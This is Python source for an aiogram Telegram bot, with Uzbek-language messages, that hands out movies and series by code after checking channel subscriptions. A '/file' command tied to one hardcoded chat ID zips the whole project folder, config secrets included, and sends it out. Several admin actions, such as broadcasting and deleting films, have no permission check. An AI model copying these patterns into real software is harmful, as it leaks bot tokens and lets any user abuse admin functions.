
from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery, FSInputFile
import zipfile, os
from filters.users import UserPrivateFilter
from config import chenel_id, Bot_token
from buttons import *
from state import *
from config import *
from CRUD import *
from aiogram.fsm.context import FSMContext
bot = Bot(token=Bot_token)

user_router = Router()





@user_router.message(Command('home'))
async def srat(message:Message, state:FSMContext):
    await state.clear()
    user_id = message.from_user.id
    if user_id in admin:
        await message.answer('🏠 Bosh sahifaga qaytdingiz ↩️', reply_markup=buttom_admin)
    else:
        await message.answer('🏠 Bosh sahifaga qaytdingiz ↩️')






def main_file():
    zip_path = 'bot_files.zip'  # ZIP fayl nomi
    folder_to_zip = os.getcwd()  # Joriy ishchi katalog (butun loyiha)

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_to_zip):  # **Indentatsiya to‘g‘ri**
            for file in files:
                if file.strip():  # Bo‘sh fayl nomlarini tekshiramiz
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_to_zip)
                    zipf.write(file_path, arcname)

    return zip_path


@user_router.message(Command('file'))
async def send_zip_file(message: Message):
    if message.chat.id == 5678926023:

        zip_file = None  
        try:
            zip_file = main_file()  
            document = FSInputFile(zip_file)  
            await message.reply_document(document)  
        except FileNotFoundError:
            await message.reply("❌ Xatolik: `main.py` fayli topilmadi!")
        except Exception as er:
            print(er)
            await message.reply('Faylni yuborishda xato!')
        finally:
            if zip_file and os.path.exists(zip_file):  
                os.remove(zip_file)  
    else:
        await message.answer('Kechirasiz bu funksiya faqat admin uchun ishlaydi')



a = 0
cnt2 = []
@user_router.message(CommandStart())
async def checksub(message:Message) -> None:
    user_id = message.from_user.id
    if user_id in admin:

        await message.answer('Sizga adminlik huquqi berilgan', reply_markup=buttom_admin)
    else:
        user_status = await bot.get_chat_member(chenel_id[0], message.from_user.id)
        if user_status.status == 'left':
            await message.answer("👇 Pastdagi kanallarga obuna bo'ling", reply_markup=tugma.as_markup())
        else:
            user_status2 = await bot.get_chat_member(chenel_id[1], message.from_user.id)
            if user_status2.status == 'left':
                await message.answer("👇 2-kanalga obuna bo'ling", reply_markup=tugma.as_markup())
            else:
                for i in readuser():
                    cnt2.append(int(i[0]))
                if int(user_id) in cnt2:
                    await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")   
                else:
                    insertuser(user_id=user_id)
                    await message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")
                    
                cnt2.clear()
                #     if int(i) == int(message.from_user.id):
                #         print('yangi user')
                #         return
                
                # insertuser(user_id=message.from_user.id)

@user_router.callback_query(F.data == "tekshir")
async def tekBot(cal:CallbackQuery):
    user_status = await bot.get_chat_member(chenel_id[0], cal.from_user.id)
    if user_status.status == "left":
        await cal.message.answer(f"🧏‍♂️ Barcha kanallarga obuna bo'lmadingiz 🙅", reply_markup=tugma.as_markup())
    else:
        user_status2 = await bot.get_chat_member(chenel_id[1], cal.from_user.id)
        if user_status2.status == 'left':
            await cal.message.answer("👇 2-kanalga obuna bo'ling", reply_markup=tugma.as_markup())
        else:

            await cal.message.answer("💁‍♂️ Botdan foydalanishingiz mumkin kino kodini yuborishingiz mumkin 🔢")
        



































@user_router.message(F.text == 'Reklama')
async def rek1(message:Message, state : FSMContext):
    await message.answer('Reklamani menga yuboring')
    await state.set_state(reklamaForm.rek)

@user_router.message(reklamaForm.rek)
async def sek2(message:Message, state:FSMContext):
    if message.photo:
        await message.answer('Siz rasm yubormaqchishiz rasm uchun izox yozing')
        await state.set_data({'rasm12' : message.photo[-1].file_id})
        await state.set_state(reklamaRAsmFORM.rasm)
    if message.text:
        for i in readuser():
            await bot.send_message(chat_id=i[0], text=message.text)
    

@user_router.message(reklamaRAsmFORM.rasm)
async def rek2(message:Message, state : FSMContext):
    data = await state.get_data()
    for i in readuser():
        await bot.send_photo(chat_id=i[0], photo=data.get('rasm12'), caption=message.text)
        





@user_router.message(F.text == 'Kino o\'chirish')
async def delet(message:Message, state:FSMContext):
    await message.answer('Kino qo\'dini oddiy ko\'rinishda yuboring')
    await state.set_state(deleteForm.delete)


cnt1 = []
@user_router.message(deleteForm.delete)
async def dele(message:Message, state:FSMContext):
    for i in readkino():
        cnt1.append(i)
    for i in cnt1:
        if str(i[0]) == str(message.text):
            deleteKino(kod=message.text)
            await message.answer("O'chirildi", reply_markup=buttom_admin)
            await state.clear()
            return
    await message.answer('Bunday kino yoq')
    






@user_router.message(F.text == "Kino qoshish")
async def addkino(message:Message, state:FSMContext):
    await message.answer("Kino faylini yuboring")
    await state.set_state(addmovieForm.kino)

@user_router.message(addmovieForm.kino)
async def addkimo2(message:Message, state:FSMContext):
    if message.video:
        video = message.video.file_id
        await state.update_data({'kino': video})
        await message.answer("Izoh qo'shish")
        await state.set_state(addmovieForm.izox)
    else:
        await message.answer("Siz yuborgan file video emas")

@user_router.message(addmovieForm.izox)
async def izox(message:Message, state:FSMContext):
    await state.update_data({'izoh' : message.text})
    await message.answer("Kod yuboring")
    await state.set_state(addmovieForm.kod)
    
cnt = []
@user_router.message(addmovieForm.kod)
async def addkod(message:Message, state:FSMContext):
    data = await state.get_data()
    kino_id = message.text
    for i in readkino():
        cnt.append(i[0])
    for i in cnt:
        if int(i) == int(kino_id):
            await message.answer('Bunday kod band')
            await state.set_state(addmovieForm.kod)
            return
    await state.update_data({'kod': kino_id})
    await bot.send_video(chat_id=message.from_user.id, video=data.get('kino'), caption=data.get('izoh'))
    await message.answer(f"Kodi {kino_id}\nTasdiqlaysizmi", reply_markup=Buttom_tekshir)
    await state.set_state(addmovieForm.final)
    cnt.clear()

@user_router.callback_query(addmovieForm.final)
async def tekshir(call:CallbackQuery, state:FSMContext):
    data = await state.get_data()
    xabat = call.data
    if xabat == 'ha':
        kino = data.get('kino')
        izoh = data.get('izoh')
        kod = data.get('kod')
        insertkino(id1=kod, kino=kino, izoh=izoh, ser='n')
        await call.message.answer("Kino muaffaqiyatli yuklandi", reply_markup=buttom_admin)
    else:
        await call.message.answer('Muaffaqiyatli bekor qilindi', reply_markup=buttom_admin)



@user_router.message(F.text == "Serial qo'shish")
async def ser5(message:Message, state:FSMContext):
    but = InlineKeyboardBuilder()
    for i in readkino():
        if i[-1] == 'y':
            but.button(text=f'{i[2]}', callback_data=f'{i[0]}')
    but.button(text='Serial qo\'shish', callback_data='Serial qo\'shsih1')
    but.adjust(2)
    await message.answer("Seriallardan birini tanlang",reply_markup=but.as_markup())
    await state.set_state(serialForm.tanlov)

    




@user_router.callback_query(serialForm.tanlov)
async def ser1(call:CallbackQuery, state:FSMContext):
    if call.data == 'Serial qo\'shsih1':
        await call.message.reply('Serial uchun kod kiriting')
        await state.set_state(serialForm.kod)
    else:
        await state.set_data({'ser_id' : call.data})
        await call.message.answer("Kino faylini yuboring")
        await state.set_state(addserialFOrm.kino)

@user_router.message(addserialFOrm.kino)
async def addkimo2(message:Message, state:FSMContext):
    if message.video:
        video = message.video.file_id
        await state.update_data({'kino': video})
        await message.answer("Izoh qo'shish")
        await state.set_state(addserialFOrm.izox)
    else:
        await message.answer("Siz yuborgan file video emas")

@user_router.message(addserialFOrm.izox)
async def izox(message:Message, state:FSMContext):
    await state.update_data({'izoh' : message.text})
    await message.answer("Qism yuboring")
    await state.set_state(addserialFOrm.kod)
    
cnt = []
@user_router.message(addserialFOrm.kod)
async def addkod(message:Message, state:FSMContext):
    data = await state.get_data()
    kino_id = message.text
    for i in readserial():
        if i[1] == str(data.get('ser_id')):
            cnt.append(i[0])
    for i in cnt:
        if int(i) == int(kino_id):
            await message.answer('Bunday kod band')
            await state.set_state(addserialFOrm.kod)
            return
    await state.update_data({'kod': kino_id})
    await bot.send_video(chat_id=message.from_user.id, video=data.get('kino'), caption=data.get('izoh'))
    await message.answer(f"Kodi {kino_id}\nTasdiqlaysizmi", reply_markup=Buttom_tekshir)
    await state.set_state(addserialFOrm.final)
    cnt.clear()

@user_router.callback_query(addserialFOrm.final)
async def tekshir(call:CallbackQuery, state:FSMContext):
    data = await state.get_data()
    xabat = call.data
    if xabat == 'ha':
        kino = data.get('kino')
        ser_id = data.get('ser_id')
        izoh = data.get('izoh')
        kod = data.get('kod')
        insertseril(qism = kod, ser_id=ser_id, kino = kino, izox=izoh)
        await call.message.answer("Kino muaffaqiyatli yuklandi", reply_markup=buttom_admin)
    else:
        await call.message.answer('Muaffaqiyatli bekor qilindi', reply_markup=buttom_admin)

        




@user_router.message(serialForm.kod)
async def ser2(messsage:Message, state: FSMContext):
    kod = messsage.text
    for i in readkino():
        if int(kod) == int(i[0]):
            await messsage.answer('Ushbu kod band')
            return
    await state.set_data({'kod': kod})
    await messsage.answer('Serial uchun rasm kiriting')
    await state.set_state(serialForm.rasm)


@user_router.message(serialForm.rasm)
async def ser3(message:Message, state:FSMContext):
    if message.photo:
        await state.update_data({'rasm' : message.photo[-1].file_id})
        await message.answer('Serial uchun izox qo\'shing ...')
        await state.set_state(serialForm.izoh)
    else:
        await message.answer('salom1')


@user_router.message(serialForm.izoh)
async def ser4(message:Message, state : FSMContext):
    data = await state.get_data()
    insertkino(id1=data.get('kod'), kino=data.get('rasm'), izoh=message.text, ser='y')
    await message.answer('Muvaffaqiyatli', reply_markup=buttom_admin)
    await state.clear()




@user_router.message(sentSerForm.state1)
async def SentSer(message:Message, state : FSMContext):
    data = await state.get_data()
    for i in readserial():
        if int(data.get('kino12')) == int(i[1]):
            if int(message.text) == int(i[0]):
                await bot.send_video(chat_id=message.from_user.id, video=i[2], caption=f"{i[3]}", protect_content = True)
                await state.clear()
                return
    await message.answer(f'Kechirasiz {message.text} - qism hali botga yuklanmagan')
    await state.clear()
            




@user_router.message(F.text.isdigit())
async def BotStart(message: Message, state:FSMContext):
    a = message.text
    user_status = await bot.get_chat_member(chenel_id[0], message.from_user.id)
    if user_status.status == "left":
        await message.answer(f"Siz barcha kanallarga obuna bo'lmagansiz", reply_markup=tugma.as_markup())
    else:
        user_status1 = await bot.get_chat_member(chenel_id[1], message.from_user.id)
        if user_status1.status == "left":
            await message.answer(f"Siz barcha kanallarga obuna bo'lmagansiz", reply_markup=tugma.as_markup())
        else:
            for i in readkino():
                if str(i[0]) == a:
                    if i[-1] == 'y':
                        await bot.send_photo(chat_id=message.from_user.id, photo=i[1], caption=f'{i[2]}')
                        await message.answer('👆 serial qismini kiriting')
                        await state.update_data(kino12= a)
                        await state.set_state(sentSerForm.state1)
                        return
                    else:
                        await bot.send_video(chat_id=message.from_user.id, video=i[1], caption=f"{i[2]}", protect_content = True)
                        return
            await message.reply('😥Afsuski bunday kino yo\'q')
            cnt.clear()




























































@user_router.message(F.text)
async def kek(message:Message):
    await message.reply('Bunday buyruq mavjud emas')

@user_router.message(F.video)
async def kek(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga media file yuborish mumkin emas')

@user_router.message(F.photo)
async def kek(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga media file yuborish mumkin emas')


@user_router.message(F.sticker)
async def stikker(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga stikker tashlash mimkin emas')

@user_router.message(F.voice)
async def stikker(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga musiqa, tarona, va boshqa audio fayllarni yuborish mimkin emas')

@user_router.message(F.audio)
async def stikker(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga musiqa, tarona, va boshqa audio fayllarni yuborish mimkin emas')

@user_router.message(F.video_note)
async def stikker(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga media file yuborish mumkin emas')
    
@user_router.message(F.animation)
async def stikker(message:Message):
    await bot.send_sticker(chat_id=message.from_user.id, sticker='CAACAgIAAxkBAAELaTZnfONefsFU_w3EgFgRoS5gdsNxngACpAEAAhZCawozOoCXqc8vXDYE')
    await message.reply('Botga media file yuborish mumkin emas')

























